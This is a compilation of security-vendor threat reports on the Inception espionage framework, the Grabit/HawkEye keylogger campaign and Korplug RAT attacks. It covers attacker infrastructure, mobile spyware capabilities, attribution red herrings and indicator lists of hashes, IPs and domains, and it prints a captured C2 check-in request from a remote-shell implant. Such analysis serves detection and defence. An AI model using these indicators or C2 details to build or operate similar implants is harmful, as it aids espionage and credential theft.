The communication between the attacker and the SOCKSS is encoded using the RC4 key .
The graphic below illustrates a typical session .
28 .
Additional servers .
The router proxy network provides another layer of indirection masking the attackers ’ infrastructure .
However , because we captured traffic through one of these embedded devices we could identify other parts of their operation .
We identified four IP addresses that connected to the proxy malware :
Cloud enumerator : Apparently a rented server at AS34224 NETERRA-AS , Bulgaria .
This host belongs to a Bulgarian VPS service and would use the router proxy to connect to webdav.cloudme.com .
This host does all scanning of webdav shares for stolen user data , and also uploads new malware components .
Health checker : Apparently a rented server at AS5577 ROOT root SA , Luxembourg .
This IP would make connections hourly and poll the status of the router proxy malware .
This machine is most likely used to track which compromised routers are currently available for use .
Unlocker : Apparently a rented server at AS52048 DATACLUB DataClub S.A .
Latvia .
Traffic from this IP had a very specific purpose : It unlocked routers for proxying in connection with the sending of phishing emails .
In the wild we observed this IP connect to our router on the malware management port and specify a SOCKSS proxy port to be opened .
Immediately after , the newly opened port would be connected to by another IP and used to send phishing emails with malicious attachments .
However , later we observed that the Email sender IP at VOLIA vanished and the Unlocker server taking over its role as well .
Email sender : An IP at AS25229 VOLIA-AS , Ukraine .
Possibly a compromised host .
After a router SOCKSS port was opened by Unlocker , this IP would connect to the opened port and tunnel its email traffic through the router .
Each of these connections used the correct encryption key , so we know that these accesses came from the attackers and not some opportunistic third party .
29 .
Mail proxies : Through our router monitoring we identified two mail proxies used by the attackers .
We were later notified by Symantec ( thanks , guys ! ) about a third .
These servers were hosted on domains that were registered by the attackers , using domain names clearly meant to look legitimate .
This is the only time we have seen attackers register domains in this investigation .
The mail proxies were :
haarmannsi.cz : Spoof of the legitimate domain haarmannsi.com sanygroup.co.uk : Spoof of the legitimate domain sanygroup.com ecolines.es : Spoof of the legitimate domain ecolines.net .
Registrant WHOIS information seems forged :
haarmannsi.cz name : Sanyi TERRAS address : R .
FREI CANECA 1120 SAO PAULO 01307-003 BR e-mail : sanyi_terras@outlook.com created : 12.06.2014 NS : ns * . frankdomains.com sanygroup.co.uk : name : Alan address : Uddmansgatan 13 Pitea Norrbottenalän 94471 SE created : 06.05.2014 NS : ns * . domains4bitcoins.com ecolines.es : name : Lyisa Almeida address : N/A created : 04.06.2014 NS : ns * . frankdomains.com .
30 .
Observed phishing emails .
The connections made from the Ukrainian host to the router were interesting .
After being proxied though the router , each of these would authenticate with one of the dedicated mail proxies and send out phishing attacks .
From captured traffic it appears that the mail proxies have SOCKSv5 services running on obscure high ports .
We have documented that the attackers log in to these using apparently randomly generated usernames and passwords , a unique pair for each server .
The mail proxy would then relay the spearphishing mail as seen below .
Above : Captured SMTP session , sending the malicious attachment MQ1474.doc .
This way the attack can be mistaken to come from legitimate businesses and trusted organizations .
In some cases the organization from which the phishing email originates would appear to be a known associate to the target .
31 .
The email shown above was one of a number of messages sent to targets in the oil industry .
Investigating the target email addresses , we saw several of these were found in this public document from the World Petroleum Council , including some addresses that are , at the present time , no longer valid .
And then , the ground shifted again .
32 .
PART III : Attacks on mobile devices .
33 .
One of the spearphishing mails we observed coming through the router network was this one , sent to an address under the gov.py ( Government of Paraguay ) domain .
Get WhatsApp now for your iPhone , Android , BlackBerry or Windows Phone .
There was no executable attachment in this mail , but instead a link shortened by the URL shortener service bit.ly , with the underlying link pointing to an IP address on a Dutch hosting service .
Clicking that link from a Windows PC only yielded a redirection to the BBC homepages , and using other devices did not give more data .
The bit.ly service does however provide information on the user creating the shortened link , and other links associated with this account .
In this case , the user was named nicolatesla53 .
34 .
The nicolatesla53 bit.ly profile page .
The nicolatesla53 account was created in July 2014 .
From Oct 24th to Nov 21st this user created nearly 10000 shortened links – we harvested 9990 unique ones .
Three IP addresses were used for these links :
82.221.100.55 82.221.100.60 94.102.50.60 .
The links themselves were on this format :
http : //server_ip/page/index ? id=target_identifier & type2=action_code .
As far as we were able to tell , there were three main types of action_code :
743 : Serve malware disguised as WhatsApp updates 1024 : Serve malware disguised as Viber updates other : Serve MMS phishing content .
The code identifies mobile operator and determines which logo will be displayed when the user follows the link .
35 .
MMS Phishing .
We have no sample of the actual MMS phishing messages apparently being sent , but we can see the page served when a user clicks a spammed link .
This is just a dialogue box asking for the password presumably included in the initial message , and the next stage likely involves download of malicious content .
The password screen for action code 16611 ( TELE2 ) .
We were in the middle of harvesting the servers for data on the various action codes when they all were abruptly taken offline ; so our data on which mobile operators are targeted is not complete .
We managed to get 66 of a total of 190 .
The ones we know of are shown below .
A full breakdown of mobile operators and related links is included in the appendix .
36 .
The composition of links created for the various mobile operators is quite interesting , as one can speculate that they represent amount of actual or planned attacks in different countries .
With the top three operators being Vodafone , T Mobile and Proximus ( Belgacom ) it seems these apparent phishing attacks are less focused on the Russian sphere than the previously discussed malware .
This map is not complete , though .
It represents only about 35 % ( 66/190 ) of all mobile operators targeted and 66 % ( 3152/4781 ) of all phishing links we managed to harvest .
In addition , some operators like Vodafone are global actors , so the map might show an unfair intensity in their HQ locations .
MMS phishing heat map .
The rest of the bit.ly links used the action codes 743 or 1024 .
And now things really get interesting .
By using mobile device HTTP User-Agents we were able to trigger downloads of malware components from some of these links .
37 .
Mobile malware : Android .
Accessing the link from an Android User-Agent initiated a download of an Android installer package named WhatsAppUpdate.apk .
The package we analyzed was 1.2MB in size .
The apparent main purpose of this malware is to record phone call audio .
Recordings are stored as * .mp4 files , and uploaded to the attackers periodically .
The malware is able to collect a lot of other information , not all of which is actually used :
• Account data • Location • Contacts • External and Internal Storage ( files written ) • Audio ( microphone ) • Outgoing calls • Incoming calls • Call log • Calendar • Browser bookmarks • Incoming SMS .
Through the encrypted C & C protocol , the attackers can issue commands and binary updates to the malware .
It uses a custom DAO/Database scheme which uses accounts belonging to the virtual community Live Journal ( livejournal.com ) as data stores .
Three such accounts were found hardcoded in the package :
The accounts all state that they belong to Iranian users .
This is very likely false .
38 .
The text in these posts starts first out in cleartext , but quickly turns into unreadable gibberish .
The HTML source code reveals that the encoded portion is encapsulated in blog-index tags :
The three accounts contain different configuration blocks pointing to C & C servers apparently located in Poland , Germany and Russia , respectively .
Based on registration data and folder configuration we believe these are legitimate but compromised Joomla servers .
And then an unexpected oddity shows up in the Java source :
The sign in front of SizeRandomStr is “ Truti ” a Hindi word meaning “ Error ” .
39 .
We were also able to download a similar malware sample ( BrowserUpdate.apk ) from one of the C & C servers .
This sample used different online accounts for its DAO/database functionality , but is otherwise quite similar to the first .
40 .
Mobile malware : Apple IOS .
Using an IOS User-Agent triggered the download of a Debian installer package , WhatsAppUpdate.deb , also 1.2Mb in size .
This application impersonates a Cydia installer , and can only be installed on a jailbroken phone .
Once installed , it may collect .
• Device platform , name , model , system name , system version • ICCID • User ’ s address book • Roaming status • Phone number • Carrierbundlename • Iso country name • Carrier name • Wifi status • MAC address • Device battery level • Free and total space • Cpu frequency and count • Total and user memory • Maxsocketbuffersize • Language local identifier and language display name • Default and local time zone • Account data : AccountAvailableServiceTypes , AccountKind , AccountSocialEnabled , etc • AppleID • CreditDisplayString • DSPersonID • IOS specific data ; ex LastBackupComputerName , LastBackupComputerType , iTunes.store-UserName , iTunes.store downloaded-apps etc .
41 .
These data are encrypted and uploaded to an FTP account which is taken from an encrypted configuration file named /usr/bin/cores .
In this particular case , the FTP account is located on a legitimate ( if struggling ) hosting service in the UK .
In this case , there ’ s another clue :
The project path in the package contains the name JohnClerk .
The WhatsAppUpdate project seems derived from an earlier template named SkypeUpdate .
42 .
Mobile malware : Blackberry .
By now , it came as no surprise when we triggered a download with a BlackBerry User-Agent .
The initial download was a Java Applications Descriptor , a text file designed for Over-The-Air installation of Java-based applications .
This JAD file contained the locations of the two Blackberry * .COD binaries which we then could download directly .
The application impersonates a settings utility .
This collects :
• deviceName , manufacturerName • platformVersion , softwareVersion • brandVendorId , brandVersion • total and free flash size of the device • amount of memory/storage already allocated • ownerName , ownerInformation • Phone mumber • PIN • IMSI • IMEI • mcc and mnc ( Mobile Carrier ID ) • cellID • Location area code • isPasswordEnabled • Battery data ( level , temperature , voltage , etc ) • Installed applications • Address book • APChannel • Connected Network Type • BSSID • DataRate • Profile Name • RadioBand • SecurityCategory • SignalLevel • SSID .
Collected data will be uploaded to a DynDNS domain currently hosted on a US webhosting service .
43 .
“ God_Save_The_Queen ” is used as a reference in one of the Blackberry binaries .
Since these COD files are also compiled Java code , they are possible to decompile to original source code .
In a similar fashion to the Android version , we find interesting strings there .
This time they are in Arabic :
“ Reading files ” in Arabic .
44 .
PART IV : Attribution .
45 .
Timelines and activity patterns .
The earliest sample of Inception-related malware we have been able to obtain , was submitted to us in June 2014 .
However , decoy document metadata shows that it was created late May .
The related cloud account was created just before that .
An examination of the other documents associated with the attacks show that they have been created at a steady pace all through summer and autumn 2014 and attacks are still ongoing .
Of interest is also the attackers ’ activity patterns over the 24h cycle .
The main upload of new components to shares seems to be divided over two high–activity periods : 6:00 10:00 UTC and 17:00 21:00 UTC .
No uploads were seen between 23:00 and 05:00 UTC .
It is however doubtful how indicative these timeframes are .
To illustrate , we looked into another and more obscure timing factor : The timing of the AES InitVector random seeds .
A random seed is the initial value passed into a pseudo-randomizer function .
The malware uses the random output to create what is known as an InitVector a starting point for the AES encryption/decryption function .
The code used in some of the DLLs indicate that the attackers tend to use the C time ( ) function to generate random seeds .
This function returns values of granularity down to seconds .
Thus random seeds , and ultimately the InitVectors , are functions of these quite coarse units of time .
The encrypted files uploaded to the WebDAV shares come with their InitVectors stored at the end of the file .
Since we know the time window to be within a few days of the upload time we were able to brute force the time values that would generate the corresponding InitVectors .
Thus , we were able to say to the second when the file was created – and most times were identified to be in the range 1500 2200 GMT .
Unfortunately , we had to reject these data .
The file creation times turned out to be hours after the files themselves were uploaded to the WebDAV share .
Either the attackers ’ system clock is wrong or a fixed offset is added to the random seed .
Either way , the data can ’ t be trusted ; and shows that nothing can be taken at face value .
46 .
The Chinese connection .
On at least two occasions during our surveillance of the Inception framework , the malware downloaded something unexpected and wholly different from what we have discussed until now .
These files were downloaded as encrypted * .bin files from the accounts carter0648 and frogs6352 .
When decrypted , these turned out to be dropper packages containing one dropper executable clearly created for the Inception framework , and one other , very different executable .
This executable , ( sccm.exe , md5 dd8790455109497d49c2fa2442cf16f7 ) is a classical Chinese APT implant .
It is a downloader and remote shell program , designed to connect to a C & C server to interact with the attacker and/or download more malware .
The C & C server in this case is ict32.msname.org .
When connecting to this server , sccm.exe issues the following request :
POST /check.jsp HTTP/1.1 Accept : * / * Accept-Language : en-us Content-Type : application/octet-stream Accept-Encoding : gzip , deflate User-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 ) Host : www.antivir.com Content-Length : 8 Connection : Keep-Alive Cache-Control : no-cache .
This C & C domain is used by many other malwares related to sccm.exe ; some of which share obvious connections to the Quarian malware family , a known APT intrusion tool .
This development was unexpected for several reasons .
First of all , it apparently breaks the strict , obfuscatory operational security built into the Inception framework .
Inception has the capacity to perform all steps needed for scouting out and exfiltrating data without resorting to traditional hosted command & control .
By using a well-understood APT tool and a known malicious C & C domain name , the attackers permit much clearer attribution .
47 .
Another factor which is out of character is the coding style .
All Inception-related malware is written using Visual Studio 2010 .
The downloaded sccm.exe is written using Visual C++ 6 ; and has a PE header compile date of October 2010 .
This date can be forged , and indeed , all Inception-related malware has some level of forgery in the compile dates .
However , the sccm.exe compile date matches the Quarian developer toolset and coding style to a better degree than the other files distributed through Inception .
Then there is the C & C domain used .
According to DomainTools.com the msname.org domain registration timed out September 27th 2014 .
It was left inactive and was not renewed until Nov 12th .
This means that the attackers distributed malware that would be out of action for a long time ( last distribution of sccm.exe was September 26th ) .
Because of all this we consider sccm.exe as an unreliable indicator .
It is likely to be a red herring purposefully placed on shares where the attackers have seen signs of access by security researchers .
An odd indicator .
At one instance the attackers seem to have slipped up .
Instead of using their scheduled task , they apparently did something manually on a WebDAV share .
This is visible because the request came from an apparent attacker IP , but used yet another User-Agent : “ gvfs/1.12.3 ” .
Gvfs is the virtual filesystem for Gnome desktop .
The action on the account was abnormal as well ; an apparent file upload :
83.53.147.144 [ 02/Sep/2014:09:53:56 +0200 ] `` PUT /tem5842/Documento % 20sin % 20t % C3 % ADtulo HTTP/1.1 '' 408 0 `` - '' `` gvfs/1.12.3 '' .
“ Documento sin título ” means “ Untitled document ” in Spanish .
When WebDAV shares are mapped up as drives by the operating system , any action taken by the attacker follows the same pattern as on the attacker ’ s local drive .
In the case above , it seems the attacker attempted to edit a new document , which by default is given the name “ Untitled document ” in Gnome .
This might indicate that the attacker ’ s operating system language is Spanish .
Of course , Spanish is one of the world ’ s most widespread languages , so one can not infer much from this .
There is even a small possibility that the phenomenon is a pure artifact ; for example that a Spanish-speaking researcher connected to the same account using the same Linux-based setup as the attackers .
48 .
Similarities with Red October .
This attack system shares a number of properties that are somewhat similar with the Red October campaigns detailed by Kaspersky Labs in 2013 .
For more information about this see : The `` Red October '' Campaign An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies .
Target countries and verticals overlap to some extent The topics of some decoy documents are the same ( eg .
“ Diplomatic Car for sale ” ) Similar overall loading architecture , with dropping of encrypted binaries that are later decrypted and loaded Exploited documents contain certain similarities ( i.e .
the magic string “ PT @ T ” used as a marker to locate the shellcode ) .
However , there are also clear differences .
The code is fully rewritten ; there appears to be little code overlap , at least in the initial stage malware .
The coding style is different , with different solutions to programmatic problems , different use of exception handling , and different use of C++ classes .
It ’ s hard to believe that the same programmers are responsible for the two code bases .
The Red October malware contained linguistic markers that pointed towards Russian speaking attackers .
No such clues have been found in the Inception related malware ; there is a marked difference in the attention to detail and information leakage .
It is certainly possible that the same people have organized both Inception and Red October , but there are no clear indications to this effect .
49 .
Strings in malware .
The Windows-based malware in this paper generally contains very few noticeable strings apart from what is commonly found in software , and clearly randomized strings .
What exists – like the word “ polymorphed ” in the early DLL versions is standard English with few discerning features .
This changes a bit when we look at the mobile malware .
In the Android malware we find Hindi comments in the Java source code .
In the Iphone malware we find project paths referencing one “ JohnClerk ” , and a few typos like “ conutry ” .
In one of the Blackberry binaries we find the string “ God_Save_The_Queen ” , a rather blunt hint towards Britain , as well as Arabic log strings .
These and other indicators have led us to conclude that the Inception attackers are setting a new standard for deliberate disinformation and red herrings in a malware espionage operation .
Some clues might have been added by accident , but none of these indicators can be trusted in any way .
Thus we are not going to assume anything about who might be behind these attacks .
50 .
Conclusion .
The whole Inception setup shows signs of automation and seasoned programming .
The amount of layers used in this scheme to protect the payload of their attack seems excessively paranoid .
Not only is the initial DLL apparently polymorphed using some backend tool – the compile time stamps in the PE header are clearly forged , resources are removed so as not to give away any location information , and import tables are shuffled around , rendering import hashes ( aka imphashes ) useless .
The names of the files both when dropped and their original names along with the callback directories , paths and mutexes used all seem to be dynamically generated .
The attackers utilize compromised embedded devices – typically routers on the Internet as well as multiple dedicated hosting providers and VPN services to mask their identity from the cloud storage provider and others .
The same router botnet is used as a spreading and management platform for attacks on mobile devices as well .
This suggests that this a large campaign and we ’ ve only seeing the beginning of it .
Initially many of the targets were located in Russia or related to Russian interests , but as the campaign has evolved we have verified targets in countries all over the world .
It is clear that this infrastructure model does not need to be applied solely against a few targets , or even need to be hosted at CloudMe .
The framework is generic , and will work as an attack platform for a multitude of purposes with very little modification .
The attribution indicators point in different directions and can ’ t be given much weight .
These attacks can in theory be the creation of nation states or resourceful private entities we consider it very unlikely that they are performed by one or just a few individuals .
© 2014 Blue Coat Systems , Inc .
All rights reserved .
Blue Coat , the Blue Coat logos , ProxySG , PacketShaper , CacheFlow , IntelligenceCenter , CacheEOS , CachePulse , Crossbeam , K9 , the K9 logo , DRTR , Mach5 , Packetwise , Policycenter , ProxyAV , ProxyClient , SGOs , WebPulse , Solera Networks , the Solera Networks logos , DeepSee , “ See Everything .
Know Everything. ” , “ Security Empowers Business ” , and BlueTouch are registered trademarks or trademarks of Blue Coat Systems , Inc .
or its affiliates in the U.S .
and certain other countries .
This list may not be complete , and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the trademark .
All other trademarks mentioned in this document owned by third parties are the property of their respective owners .
This document is for informational purposes only .
Blue Coat makes no warranties , express , implied , or statutory , as to the information in this document .
51 .
APPENDIX :
Exploited RTF sample md5 ’ s :
0a0f5a4556c2a536ae7b81c14917ec98 19ad782b0c58037b60351780b0f43e43 20c2a4db77aabec46750878499c15354 23d6fabda409d7fc570c2238c5487a90 3ff9c9e3228b630b8a68a05d6c3e396d 4624da84cae0f8b689169e24be8f7410 4a4874fa5217a8523bf4d1954efb26ef 4dcdc1110d87e91cda19801755d0bcf2 516a514bf744efb5e74839ddaf02a540 5e3ecfd7928822f67fbb3cd9c83be841 685d9341228f18b0fd7373b7088e56a7 822d842704596a2cf918863ea2116633 8488303c2a0065d9ac8b5fecf1cb4fc9 8997d23b3d1bd96b596baee810333897 8cd5974a49a9d6c49294312bf09f64ed 9738faf227bcd12bcab577a0fb58744d bc196dc8a14484e700169e1a78cf879e b453ec7fd92bee23846ff36bf903ddc0 2fcbea8a344137421a86b046a6840265 .
Dropped first-stage DLL ’ s .
0bd0fd3cbbcfddc4048228ce08ca26c2 0bda50e05d575446de55d50c631afb53 0f12614fa7a9bf7bcc951eec7b78658d 2f9ca7680ec0945455988d91d9b325f8 352da994d867eb68a178bb7f2fb672bc 3a4a9d26c9c3c8d0fd697b036216319e 43587e5fcf6770259026ec2ca6f41aa6 4628082e11c75b078ff0465523598040 554d4c4da2e3603282b097b0e68ad11a 670ac2e315088d22b2cb92acffc3e997 71bdd14cbc96badb79dfb0f23c52a9ee 72f020b564bc9771e7efe203881f5ef9 80a7883c33a60b4c0178c9c8fb7d1440 84fa976d9ed693668b3f97d991da0e97 89d851cbd2dc1988bb053235414f8928 a5aeda357ba30d87c1187b644baad8a0 c3f2fb7840228924e5af17787e163e07 d007616dd3b2d52c30c0ebb0937e21b4 d171db37ef28f42740644f4028bcf727 d3886495935438f4a130d217d84ae8cb ea0d80db2075f789fc88c3fdf6e3d93e .
52 .
f2840be535fbaf8b15470d61967d527b 90c93c9b80bbf31dce8434a565a0ec7b .
53 .
Downloaded second-stage plugins :
5c3de5b2762f4c5f91affaa6bcadd21b 86b2372297619b1a9d8ad5acdf1a6467 43112e09240caebb3c72855c9f6fc9e5 .
Downloaded Chinese malware , sccm.exe :
dd8790455109497d49c2fa2442cf16f7 .
Router proxy malware :
a6b2ce1cc02c902ba6374210faf786a3 83b383884405190683d748f4a95f48d4 62fc46151cfe1e57a8fa00065bde57b0 036fbc5bffd664bc369b467f9874fac4 488e54526aa45a47f7974b4c84c1469a 24a9bbb0d4418d97d9050a3dd085a188 b0c2466feb24519c133ee04748ff293f 62dc87d1d6b99ae2818a34932877c0a4 7c6727b173086df15aa1ca15f1572b3f 80528b1c4485eb1f4a306cff768151c5 e1d51aa28159c25121476ffe5f2fc692 .
Android malware :
046a3e7c376ba4b6eb21846db9fc02df b0d1e42d342e56bc0d20627a7ef1f612 .
IOS malware ( WhatsAppUpdate.deb ) :
4e037e1e945e9ad4772430272512831c .
Blackberry malware :
0fb60461d67cd4008e55feceeda0ee71 60dac48e555d139e29edaec41c85e2b4 .
Attacker-owned domains :
haarmannsi.cz sanygroup.co.uk ecolines.es blackberry-support.herokuapp.com ( DynDNS ) .
Grabit and the RATs .
Not so long ago , Kaspersky clients in the United States approached Kaspersky researchers with a request to investigate a new type of malicious software that they were able to recover from their organizations ’ servers .
The malware calls itself Grabit and is distinctive because of its versatile behavior .
Every sample we found was different in size and activity from the others but the internal name and other identifiers were disturbingly similar .
The timestamp seems valid and close to the documented infection timeline .
Our documentation points to a campaign that started somewhere in late February 2015 and ended in mid March .
As the development phase supposedly ended , malware started spreading from India , the United States and Israel to other countries around the globe .
All of the dozens of samples we managed to collect were programmed in Windows machine 32bit processor , over the Microsoft .NET Framework ( Visual Basic/C # ) .
Files were compiled over the course of three days , between March 7th and 9th of 2015 .
The following chart illustrates how the group or individual created the samples , the size of each sample , the time of the day when each was compiled and the time lapses between each compilation .
Malware compilation timeline .
The smallest sample ( 0.52Mb ) and the largest ( 1.57Mb ) were both created on the same day , which could indicate experiments made by the group to test features , packers and “ dead code ” implementations .
Looking at the chart , it is interesting to see the modus operandi as the threat actor consistently strives to achieve a variety of samples , different code sizes and supposedly more complicated obfuscation .
Along with these different sizes , activities and obfuscation , a serious encryption algorithm was also implemented in each one of them .
The proprietary obfuscated string , methods and classes made it rather challenging to analyze .
ASLR is also enabled , which might point to an open source RAT or even a commercial framework that packed the malicious software in a well written structure .
This type of work is known as a mitigation factor for threat actors to keep their code hidden from analysts ’ eyes .
During our research , dynamic analysis showed that the malicious software ’ s “ call home ” functionality communicates over obvious channels and does not go the extra mile to hide its activity .
In addition , the files themselves were not programmed to make any kind of registry maneuvers that would hide them from Windows Explorer .
Taking that into an equation , it seems that the threat actors are sending a “ weak knight in a heavy armor ” to war .
It means that whoever programmed the malware did not write all the code from scratch .
A well trained knight would never go to war with a blazing shield and yet a stick for a sword .
Looking into the “ call home ” traffic , the Keylogger functionality prepares files that act as a container for keyboard interrupts , collecting hostnames , application names , usernames and passwords .
However , the interesting part lies here .
The file names contain a very informative string : HawkEye_Keylogger_Execution_Confirmed_ .
3.10.2015 6:08:31 PM HawkEye is a commercial tool that has been in development for a few years now ; it appeared in 2014 , as a website called HawkEyeProducts , and made a very famous contribution to the hacker community .
In the website , the product shows great versatility as it contains many types of RATs , features and functionality , such as the traditional HawkEye Logger or other types of remote administration tools like Cyborg Logger , CyberGate , DarkComet , NanoCore and more .
It seems to support three types of delivery : FTP , SMTP and Web-Panel .
As seen , the malware uses a number of RATs to control its victims or track their activity .
One of the threat actor ’ s successful implementations contained the well-known DarkComet .
This convenient “ choose your RAT ” functionality plays a very important role in the malware infection , routine and survival on the victim ’ s machine .
The DarkComet samples are more complicated than the traditional HawkEye logger .
One instance had a random key generator which sets an initialization vector of the first 4 bytes of the executable file and appends a random 5 byte key that unpacks another PE file , less than 20Kb in size .
The PE file then contains another packer with an even more challenging obfuscation technique .
The last sample we tested had still more complicated behavior .
The code itself had the same obfuscation technique , though traffic was not transferring in clear text .
Stolen data was packed and sent encrypted over HTTP random ports .
This means that the group is trying to produce other types of malicious samples with different RATs .
Approximately 10,000 stolen files have been collected .
Companies based in Thailand and India had the largest percentage of infected machines .
By looking at the stolen credentials , it is very clear that employees sent the malware to one another , as stolen host names and internal applications are the same .
The following is the full chart , updated to May 2015 :
Malware distribution by country Demonstrating the effectiveness of their simple Keyloggers , one C2 ( on May 15th ) maintained thousands of victim account credentials from hundreds of infected systems .
To sum it up , Grabit threat actors did not use any sophisticated evasions or maneuvers in their dynamic activity .
It is interesting to see the major differences between the core development of the malware and the actual functionality it uses .
Some malware samples used the same hosting server , and even the same credentials .
Could it be that our threat actor was in a hurry ? Our guess is that we are looking at a group and not an individual .
Some members of the group are more technical than the others and some are more security oriented and aware of the risks they might expose themselves to .
Back to square one : From what we have seen so far , the malware is being delivered as a Microsoft Office Word ( .doc ) email attachment , containing a malicious macro called AutoOpen .
This macro simply opens a socket over TCP and sends an HTTP request to a remote server that was hacked by the group to serve as a malware hub , before downloading the malware .
In some cases the malicious macro was password protected , but our threat actor might have forgotten that a .doc file is actually an archive and when that archive is opened in a convenient editor of your choice , the macro strings are shown in clear-text .
The malware is in plain view , modifying commonplace registry entries , such as the startup configurations , and not covering its tracks .
Its binaries are not deleted in most cases , and its communication is in clear text , where the victim can sniff the communication and grab the FTP/SMTP server ’ s credentials .
Malware derivatives are mainly located in : C : \Users\ .
\AppData\Roaming\Microsoft Phishing extensions : .doc 3f77403a64a2dde60c4962a6752de601d56a621a 4E7765F3BF73AEC6E350F412B623C23D37964DFC Icons : .pdf , .doc , .ttf , .xls , .ppt , .msg , .exe Stealer : .txt , .jpeg , .eml Additional Executable names :
AudioEndpointBuilder.exe BrokerInfrastructure.exe WindowsUpdate.exe .
Malware extensions : .zip or .exe .
9b48a2e82d8a82c1717f135fa750ba774403e972b6edb2a522f9870bed57e72a ea57da38870f0460f526b8504b5f4f1af3ee490ba8acfde4ad781a4e206a3d27 0b96811e4f4cfaa57fe47ebc369fdac7dfb4a900a2af8a07a7b3f513eb3e0dfa 1948f57cad96d37df95da2ee0057dd91dd4a9a67153efc278aa0736113f969e5 1d15003732430c004997f0df7cac7749ae10f992bea217a8da84e1c957143b1c 2049352f94a75978761a5367b01d486283aab1b7b94df7b08cf856f92352166b 26c6167dfcb7cda40621a952eac03b87a2f0dff1769ab9d09dafd09edc1a4c29 2e4507ff9e490f9137b73229cb0cd7b04b4dd88637890059eb1b90a757e99bcf 3928ea510a114ad0411a3528cd894f6b65f59e3d52532d3e0c35157b1de27651 710960677066beba4db33a62e59d069676ffce4a01e63dc968ad7446158f55d6 7371983a64ef9389bf3bfa8d2abacd3a909d13c3ee8b53cccf437026d5925df5 76ba61e510a340f8751e46449a7d857a2d242bd4724d0d040b060137ab5fb31a 78970883afe52e4ee846f4a7cf75b569f6e5a8e7a830d69358a8b33d186d6fec 7c8c3247ffeb269dbf840c7648e9bfaa8cf3d375a03066b57773c48de2b6d477 7f0c4d3644fdcd8ac5bc2e007bb5c3e9eab56a3d2d470bb796af88125cd74ac9 .
IP Addresses :
31.220.16.147 204.152.219.78 128.90.15.98 31.170.163.242 185.77.128.65 193.0.200.136 208.91.199.223 31.170.164.81 185.28.21.35 185.28.21.32 112.209.76.184 .
Korplug military targeted attacks : Afghanistan & Tajikistan .
After taking a look at recent Korplug ( PlugX ) detections , we identified two larger scale campaigns employing this well-known Remote Access Trojan .
This blog gives an overview of the first one , related to Afghanistan & Tajikistan .
The other campaign , where the targets were a number of high-profile organizations in Russia , will be the subject of Anton Cherepanov ’ s presentation at the ZeroNights security conference in Moscow this week .
Sometimes malware used in various attacks is unique enough to identify related incidents , which makes tracking individual botnets simpler .
An example is the BlackEnergy Lite variant ( also known as BlackEnergy 3 ) used by a group of attackers ( that was then given the name Quedagh , or Sandworm ) against targets in Ukraine and other countries .
BlackEnergy Lite is clearly distinguishable from the numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild .
In other cases , attackers use more common tools for accomplishing their criminal goals .
For example , the Korplug RAT ( a.k.a .PlugX ) is a well-known toolkit associated with Chinese APT groups and used in a large number of targeted attacks since 2012 .
For the past several weeks we have taken a closer look at a great number of detections of this malware in many unrelated incidents .
Among these , we were able to discover several successful infections where the employed Korplug samples were connecting to the same C & C domain .
DOMAIN : www.notebookhk.net Updated Date : 2013-11-12 18:03:45 Create Date : 2013-06-18 11:08:17 Registrant Name : lee stan Registrant Organization : lee stan Registrant Street : xianggangdiqu Registrant City : xianggangdiqu Registrant State : xianggang Registrant Postal Code : 796373 Registrant Country : HK Registrant Phone : +0.04375094543 Registrant Fax : +0.04375094543 Registrant Email : stanlee@gmail.com .
Other Korplug samples were connecting to a different domain name resolving to the same IPs as notebookhk.net :
DOMAIN : www.dicemention.com Updated Date : 2013-11-12 18:05:33 Create Date : 2013-09-10 14:35:11 Registrant Name : z x Registrant Organization : z x Registrant Street : xianggangdiqu Registrant City : xianggangdiqu Registrant State : xianggang Registrant Postal Code : 123456 Registrant Country : HK Registrant Phone : +0.0126324313 Registrant Fax : +0.0126324313 Registrant Email : 123@123.com DOMAIN : www.abudlrasul.com Updated Date : 2014-10-16 14:16:27 Create Date : 2014-10-16 14:16:27 Registrant Name : gang xin Registrant Organization : gang xin Registrant Street : Argentina Argentina Registrant City : Argentina Registrant State : Argentina Registrant Postal Code : 647902 Registrant Country : AR Registrant Phone : +54.0899567089 Registrant Fax : +54.0899567089 Registrant Email : woffg89@yahoo.com .
Taking these C & Cs as a starting point , we were able to locate a number of victims infected through various exploit-laden spear-phishing documents and cunningly-named archives .
A table with a selection of RTF documents and RAR self-extracting archives with a .SCR extension is shown below :
English File name SHA1 translation Situation Report about 36119221826D0290BC23371B55A8C0E6A84718DD Afghan.doc AGREEMENT BETWEENTHE NATO AND AFGHANISTAN ON THE STATUS OF NATO A6642BC9F3425F0AB93D462002456BE231BB5646 FORCES IN AFGHANISTAN.doc news.doc 51CDC273B5638E06906BCB700335E288807744B5 План деятельности Activity plan for соединений и воинских military units in the EA6EE9EAB546FB9F93B75DCB650AF22A95486391 частей Приволжского Volga region in July региона на июль 2014 г.scr 2014 Telephone directory телефонный справочник of the Ministry of D297DC7D29E42E8D37C951B0B11629051EEBE9C0 структуры МИД КР .scr Foreign Affairs of the Kyrgyz Republic О Центре социальной About the Center for адаптации social adaptation of 8E5E19EBE719EBF7F8BE4290931FFA173E658CB8 военнослужащих.scr servicemen Meeting minutes of Протокол встречи НГШ the General Staff of 1F726E94B90034E7ABD148FE31EBA08774D1506F КНР.scr the PRC исправленный шаблон плана Corrected action A9C627AA09B8CC50A83FF2728A3978492AEB79D8 мероприятий.scr plan template Situation Report about A9C627AA09B8CC50A83FF2728A3978492AEB79D8 Afghan.scr Military and political Военно-политическая situation in Islamic обстановка в ИРА Republic of E32081C56F39EA14DFD1E449C28219D264D80B2F на04.10.2014.scr Afghanistan ( IRA ) on 04.10.2014 Afghan Air Force.scr E32081C56F39EA14DFD1E449C28219D264D80B2F план мероприятий.scr Action plan 1F726E94B90034E7ABD148FE31EBA08774D1506F .
Some of the above-mentioned files also contained decoy documents :
In all of the cases , three binary files were dropped ( apart from decoy documents ) that led to the Korplug trojan being loading into memory .
exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a specific file name dll – a small DLL loader that would pass execution to the Korplug raw binary code dll.avp – raw Korplug binary .
The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables and is a way to stay under the radar , since a trusted application with a valid signature among startup items is less likely to raise suspicion .
The maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability in Microsoft Word .
